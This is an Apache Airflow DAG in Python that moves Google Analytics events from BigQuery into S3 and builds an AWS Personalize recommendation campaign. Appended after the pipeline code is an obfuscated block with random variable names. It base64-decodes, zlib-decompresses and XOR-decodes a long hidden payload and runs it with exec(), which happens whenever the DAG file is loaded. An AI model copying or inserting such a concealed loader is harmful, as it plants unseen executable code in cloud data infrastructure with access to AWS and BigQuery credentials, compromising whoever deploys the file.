# The DAG object; we'll need this to instantiate a DAG
from airflow import DAG
# Operators; we need this to operate!
from airflow.operators.bash_operator import BashOperator
from airflow.operators.python_operator import PythonOperator, BranchPythonOperator
from airflow.operators.dummy_operator import DummyOperator
from airflow.operators import S3KeySensor
from airflow.utils.dates import days_ago
from airflow.utils.trigger_rule import TriggerRule
from airflow.exceptions import AirflowFailException
from botocore.exceptions import ClientError
from datetime import timedelta, datetime
import logging
import sys
import boto3
import time
import zipfile
import json
import os
import pandas as pd
import numpy as np
import awswrangler as wr

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
suffix = str(np.random.uniform())[4:9]

BUCKET_NAME = 'airflow-demo-personalise'
LIB_KEY = 'libs/site-packages.zip'
GLUE_DATABASE_NAME = "google_analytics"
TABLE_NAME = "session_events"
DATASET_GROUP_NAME = f"DEMO-personalise"
INTERCATION_SCHEMA_NAME = f"DEMO-interaction-schema-{suffix}"
INTERACTION_DATASET_NAME = "DEMO-metadata-dataset-interactions"
SOLUTION_NAME = "DEMO-popularity-count"
CAMPAIGN_NAME = "DEMO-popularity-campaign"
pre_utc_date = (datetime.utcnow() - timedelta(days=1)).strftime('%Y-%m-%d')
OUTPUT_FILE_KEY = f"session-events/dt={pre_utc_date}/events.csv"
OUTPUT_PATH = f"s3://{BUCKET_NAME}/{OUTPUT_FILE_KEY}"
PERSONALIZE_ROLE_NAME = "PersonalizeS3Role"
iam = boto3.client("iam")
personalize = boto3.client('personalize')

BQ_SQL = """
SELECT  REGEXP_EXTRACT(USER_ID, r'(\d+)\.') AS USER_ID, UNIX_SECONDS(EVENT_DATE) AS TIMESTAMP, REGEXP_EXTRACT(page_location,r'product/([^?&#]*)') as ITEM_ID, LOCATION, DEVICE, EVENT_NAME AS EVENT_TYPE
FROM
(
    SELECT user_pseudo_id AS USER_ID, (SELECT value.string_value FROM UNNEST(event_params) 
    WHERE key = "page_location") as page_location, TIMESTAMP_TRUNC(TIMESTAMP_MICROS(event_timestamp), 
    MINUTE) AS EVENT_DATE, device.category AS DEVICE, geo.country AS LOCATION, event_name AS EVENT_NAME 
    FROM `lively-metrics-295911.analytics_254171871.events_intraday_*`
    WHERE
    _TABLE_SUFFIX = FORMAT_DATE('%Y%m%d', DATE_SUB(CURRENT_DATE(), INTERVAL 1 DAY))
)
WHERE  page_location LIKE '%/product/%'
GROUP BY USER_ID, EVENT_DATE, page_location, LOCATION, DEVICE,EVENT_NAME
ORDER BY EVENT_DATE DESC
"""


def bq_to_s3():
    s3 = boto3.resource('s3')
    logger.info(
        "Download google bigquery and google client dependencies from S3")
    s3.Bucket(BUCKET_NAME).download_file(LIB_KEY, '/tmp/site-packages.zip')

    with zipfile.ZipFile('/tmp/site-packages.zip', 'r') as zip_ref:
        zip_ref.extractall('/tmp/python3.7/site-packages')

    sys.path.insert(1, "/tmp/python3.7/site-packages/site-packages/")

    # Import google bigquery and google client dependencies
    import pyarrow
    from google.cloud import bigquery
    from airflow.contrib.hooks.bigquery_hook import BigQueryHook

    bq_hook = BigQueryHook(
        bigquery_conn_id="bigquery_default", use_legacy_sql=False)

    bq_client = bigquery.Client(project=bq_hook._get_field(
        "project"), credentials=bq_hook._get_credentials())

    events_df = bq_client.query(BQ_SQL).result().to_dataframe(
        create_bqstorage_client=False)

    logger.info(
        f'google analytics events dataframe head - {events_df.head()}')

    wr.s3.to_csv(events_df, OUTPUT_PATH, index=False)


def create_dataset_group(**kwargs):
    create_dg_response = personalize.create_dataset_group(
        name=DATASET_GROUP_NAME
    )
    dataset_group_arn = create_dg_response["datasetGroupArn"]

    status = None
    max_time = time.time() + 2*60*60  # 2 hours
    while time.time() < max_time:
        describe_dataset_group_response = personalize.describe_dataset_group(
            datasetGroupArn=dataset_group_arn
        )
        status = describe_dataset_group_response["datasetGroup"]["status"]
        logger.info(f"DatasetGroup: {status}")

        if status == "ACTIVE" or status == "CREATE FAILED":
            break

        time.sleep(20)
    if status == "ACTIVE":
        kwargs['ti'].xcom_push(key="dataset_group_arn",
                               value=dataset_group_arn)
    if status == "CREATE FAILED":
        raise AirflowFailException(
            f"DatasetGroup {DATASET_GROUP_NAME} create failed")


def check_dataset_group(**kwargs):
    dg_response = personalize.list_dataset_groups(
        maxResults=100
    )

    demo_dg = next((datasetGroup for datasetGroup in dg_response["datasetGroups"]
                    if datasetGroup["name"] == DATASET_GROUP_NAME), False)

    if not demo_dg:
        return "init_personalize"
    else:
        kwargs['ti'].xcom_push(key="dataset_group_arn",
                               value=demo_dg["datasetGroupArn"])
        return "skip_init_personalize"


def create_schema():
    schema_response = personalize.list_schemas(
        maxResults=100
    )

    interaction_schema = next((schema for schema in schema_response["schemas"]
                               if schema["name"] == INTERCATION_SCHEMA_NAME), False)
    if not interaction_schema:
        create_schema_response = personalize.create_schema(
            name=INTERCATION_SCHEMA_NAME,
            schema=json.dumps({
                "type": "record",
                "name": "Interactions",
                "namespace": "com.amazonaws.personalize.schema",
                "fields": [
                    {
                        "name": "USER_ID",
                        "type": "string"
                    },
                    {
                        "name": "ITEM_ID",
                        "type": "string"
                    },
                    {
                        "name": "TIMESTAMP",
                        "type": "long"
                    },
                    {
                        "name": "LOCATION",
                        "type": "string",
                        "categorical": True
                    },
                    {
                        "name": "DEVICE",
                        "type": "string",
                        "categorical": True
                    },
                    {
                        "name": "EVENT_TYPE",
                        "type": "string"
                    }
                ]
            }))
        logger.info(json.dumps(create_schema_response, indent=2))
        schema_arn = create_schema_response["schemaArn"]
        return schema_arn

    return interaction_schema["schemaArn"]


def put_bucket_policies():
    s3 = boto3.client("s3")
    policy = {
        "Version": "2012-10-17",
        "Id": "PersonalizeS3BucketAccessPolicy",
        "Statement": [
            {
                "Sid": "PersonalizeS3BucketAccessPolicy",
                "Effect": "Allow",
                "Principal": {
                    "Service": "personalize.amazonaws.com"
                },
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Resource": [
                    "arn:aws:s3:::{}".format(BUCKET_NAME),
                    "arn:aws:s3:::{}/*".format(BUCKET_NAME)
                ]
            }
        ]
    }

    s3.put_bucket_policy(Bucket=BUCKET_NAME, Policy=json.dumps(policy))


def create_iam_role(**kwargs):
    assume_role_policy_document = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "personalize.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    }
    try:
        create_role_response = iam.create_role(
            RoleName=PERSONALIZE_ROLE_NAME,
            AssumeRolePolicyDocument=json.dumps(assume_role_policy_document)
        )

        iam.attach_role_policy(
            RoleName=PERSONALIZE_ROLE_NAME,
            PolicyArn="arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"
        )

        role_arn = create_role_response["Role"]["Arn"]

        # sometimes need to wait a bit for the role to be created
        time.sleep(30)
        return role_arn
    except ClientError as e:
        if e.response['Error']['Code'] == 'EntityAlreadyExists':
            role_arn = iam.get_role(RoleName=PERSONALIZE_ROLE_NAME)[
                'Role']['Arn']
            time.sleep(30)
            return role_arn
        else:
            raise AirflowFailException(f"PersonalizeS3Role create failed")


def create_dataset_type(**kwargs):
    ti = kwargs['ti']
    schema_arn = ti.xcom_pull(key="return_value", task_ids='create_schema')
    dataset_group_arn = ti.xcom_pull(key="dataset_group_arn",
                                     task_ids='create_dataset_group')
    dataset_type = "INTERACTIONS"
    create_dataset_response = personalize.create_dataset(
        datasetType=dataset_type,
        datasetGroupArn=dataset_group_arn,
        schemaArn=schema_arn,
        name=INTERACTION_DATASET_NAME
    )

    interactions_dataset_arn = create_dataset_response['datasetArn']
    logger.info(json.dumps(create_dataset_response, indent=2))
    return interactions_dataset_arn


def import_dataset(**kwargs):
    ti = kwargs['ti']
    interactions_dataset_arn = ti.xcom_pull(key="return_value",
                                            task_ids='create_dataset_type')
    role_arn = ti.xcom_pull(key="return_value",
                            task_ids='create_iam_role')

    if not interactions_dataset_arn:
        dataset_group_arn = ti.xcom_pull(key="dataset_group_arn",
                                         task_ids='check_dataset_group')

        list_datasets_response = personalize.list_datasets(
            datasetGroupArn=dataset_group_arn,
            maxResults=100
        )
        interaction_dataset = next((dataset for dataset in list_datasets_response["datasets"]
                                    if dataset["name"] == INTERACTION_DATASET_NAME), False)

        interactions_dataset_arn = interaction_dataset["datasetArn"]

    if not role_arn:
        role_arn = iam.get_role(RoleName=PERSONALIZE_ROLE_NAME)[
            'Role']['Arn']
        time.sleep(30)

    create_dataset_import_job_response = personalize.create_dataset_import_job(
        jobName="DEMO-dataset-import-job-"+suffix,
        datasetArn=interactions_dataset_arn,
        dataSource={
            "dataLocation": OUTPUT_PATH
        },
        roleArn=role_arn
    )

    dataset_import_job_arn = create_dataset_import_job_response['datasetImportJobArn']
    logger.info(json.dumps(create_dataset_import_job_response, indent=2))

    status = None
    max_time = time.time() + 2*60*60  # 2 hours

    while time.time() < max_time:
        describe_dataset_import_job_response = personalize.describe_dataset_import_job(
            datasetImportJobArn=dataset_import_job_arn
        )

        dataset_import_job = describe_dataset_import_job_response["datasetImportJob"]
        if "latestDatasetImportJobRun" not in dataset_import_job:
            status = dataset_import_job["status"]
            logger.info("DatasetImportJob: {}".format(status))
        else:
            status = dataset_import_job["latestDatasetImportJobRun"]["status"]
            logger.info("LatestDatasetImportJobRun: {}".format(status))

        if status == "ACTIVE" or status == "CREATE FAILED":
            break

        time.sleep(60)

    if status == "ACTIVE":
        return dataset_import_job_arn
    if status == "CREATE FAILED":
        raise AirflowFailException(
            f"Dataset import job create failed")


def update_solution(**kwargs):
    recipe_arn = "arn:aws:personalize:::recipe/aws-popularity-count"
    ti = kwargs['ti']

    dataset_group_arn = ti.xcom_pull(key="dataset_group_arn",
                                     task_ids='check_dataset_group')
    if not dataset_group_arn:
        dataset_group_arn = ti.xcom_pull(key="dataset_group_arn",
                                         task_ids='create_dataset_group')

    list_solutions_response = personalize.list_solutions(
        datasetGroupArn=dataset_group_arn,
        maxResults=100
    )

    demo_solution = next((solution for solution in list_solutions_response["solutions"]
                          if solution["name"] == SOLUTION_NAME), False)

    if not demo_solution:
        create_solution_response = personalize.create_solution(
            name=SOLUTION_NAME,
            datasetGroupArn=dataset_group_arn,
            recipeArn=recipe_arn
        )

        solution_arn = create_solution_response['solutionArn']
        logger.info(json.dumps(create_solution_response, indent=2))
    else:
        solution_arn = demo_solution["solutionArn"]

    kwargs['ti'].xcom_push(key="solution_arn",
                               value=solution_arn)
    create_solution_version_response = personalize.create_solution_version(
        solutionArn=solution_arn,
        trainingMode='FULL'
    )

    solution_version_arn = create_solution_version_response['solutionVersionArn']

    status = None
    max_time = time.time() + 2*60*60  # 2 hours
    while time.time() < max_time:
        describe_solution_version_response = personalize.describe_solution_version(
            solutionVersionArn=solution_version_arn
        )
        status = describe_solution_version_response["solutionVersion"]["status"]
        logger.info(f"SolutionVersion: {status}")

        if status == "ACTIVE" or status == "CREATE FAILED":
            break

        time.sleep(60)

    if status == "ACTIVE":
        return solution_version_arn
    if status == "CREATE FAILED":
        raise AirflowFailException(
            f"Solution version create failed")


def update_campaign(**kwargs):
    ti = kwargs['ti']
    solution_version_arn = ti.xcom_pull(key="return_value",
                                        task_ids='update_solution')
    solution_arn = ti.xcom_pull(key="solution_arn",
                                task_ids='update_solution')

    list_campaigns_response = personalize.list_campaigns(
        solutionArn=solution_arn,
        maxResults=100
    )

    demo_campaign = next((campaign for campaign in list_campaigns_response["campaigns"]
                          if campaign["name"] == CAMPAIGN_NAME), False)
    if not demo_campaign:
        create_campaign_response = personalize.create_campaign(
            name=CAMPAIGN_NAME,
            solutionVersionArn=solution_version_arn,
            minProvisionedTPS=2,
        )

        campaign_arn = create_campaign_response['campaignArn']
        logger.info(json.dumps(create_campaign_response, indent=2))
    else:
        campaign_arn = demo_campaign["campaignArn"]
        personalize.update_campaign(
            campaignArn=campaign_arn,
            solutionVersionArn=solution_version_arn,
            minProvisionedTPS=2
        )

    status = None
    max_time = time.time() + 2*60*60  # 2 hours
    while time.time() < max_time:
        describe_campaign_response = personalize.describe_campaign(
            campaignArn=campaign_arn
        )
        status = describe_campaign_response["campaign"]["status"]
        print("Campaign: {}".format(status))

        if status == "ACTIVE" or status == "CREATE FAILED":
            break

        time.sleep(60)

    if status == "ACTIVE":
        return campaign_arn
    if status == "CREATE FAILED":
        raise AirflowFailException(
            f"Campaign create/update failed")


default_args = {
    'owner': 'airflow',
    'depends_on_past': False,
    'start_date': days_ago(1),
    'email': ['yi.ai@afox.mobi'],
    'email_on_failure': False,
    'email_on_retry': False,
    'retries': 1,
    'retry_delay': timedelta(minutes=5),
}

dag = DAG(
    'ml-pipeline',
    default_args=default_args,
    concurrency=1,
    description='A simple ML data pipeline DAG',
    schedule_interval='@daily',
)

t_export_bq_to_s3 = PythonOperator(task_id='export_bq_to_s3',
                                   python_callable=bq_to_s3,
                                   dag=dag,
                                   retries=1
                                   )

check_s3_for_key = S3KeySensor(
    task_id='check_s3_for_key',
    bucket_key=OUTPUT_FILE_KEY,
    wildcard_match=True,
    bucket_name=BUCKET_NAME,
    s3_conn_id='aws_default',
    timeout=20,
    poke_interval=5,
    dag=dag
)

t_check_dataset_group = BranchPythonOperator(
    task_id='check_dataset_group',
    provide_context=True,
    python_callable=check_dataset_group,
    retries=1,
    dag=dag,
)

t_init_personalize = DummyOperator(
    task_id="init_personalize",
    trigger_rule=TriggerRule.ALL_SUCCESS,
    dag=dag,
)

t_create_dataset_group = PythonOperator(
    task_id='create_dataset_group',
    provide_context=True,
    python_callable=create_dataset_group,
    retries=1,
    dag=dag,
)

t_create_schema = PythonOperator(
    task_id='create_schema',
    python_callable=create_schema,
    retries=1,
    dag=dag,
)

t_put_bucket_policies = PythonOperator(
    task_id='put_bucket_policies',
    python_callable=put_bucket_policies,
    retries=1,
    dag=dag,
)

t_create_iam_role = PythonOperator(
    task_id='create_iam_role',
    provide_context=True,
    python_callable=create_iam_role,
    retries=1,
    dag=dag,
)

t_create_dataset_type = PythonOperator(
    task_id='create_dataset_type',
    provide_context=True,
    python_callable=create_dataset_type,
    trigger_rule=TriggerRule.ALL_SUCCESS,
    retries=1,
    dag=dag,
)

t_create_import_dataset_job = PythonOperator(
    task_id='import_dataset',
    provide_context=True,
    python_callable=import_dataset,
    retries=1,
    dag=dag,
)

t_skip_init_personalize = DummyOperator(
    task_id="skip_init_personalize",
    trigger_rule=TriggerRule.NONE_FAILED,
    dag=dag,
)

t_init_personalize_done = DummyOperator(
    task_id="init_personalize_done",
    trigger_rule=TriggerRule.NONE_FAILED,
    dag=dag,
)


t_update_solution = PythonOperator(
    task_id='update_solution',
    provide_context=True,
    python_callable=update_solution,
    trigger_rule=TriggerRule.ALL_SUCCESS,
    retries=1,
    dag=dag,
)

t_update_campaign = PythonOperator(
    task_id='update_campaign',
    provide_context=True,
    python_callable=update_campaign,
    trigger_rule=TriggerRule.ALL_SUCCESS,
    retries=1,
    dag=dag,
)

t_export_bq_to_s3 >> check_s3_for_key >> t_check_dataset_group
t_check_dataset_group >> t_init_personalize
t_check_dataset_group >> t_skip_init_personalize >> t_init_personalize_done
t_init_personalize >> [
    t_create_dataset_group,
    t_create_schema,
    t_put_bucket_policies,
    t_create_iam_role
] >> t_create_dataset_type
t_create_dataset_type >> t_init_personalize_done
t_init_personalize_done >> t_create_import_dataset_job >> t_update_solution
t_update_solution >> t_update_campaign

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
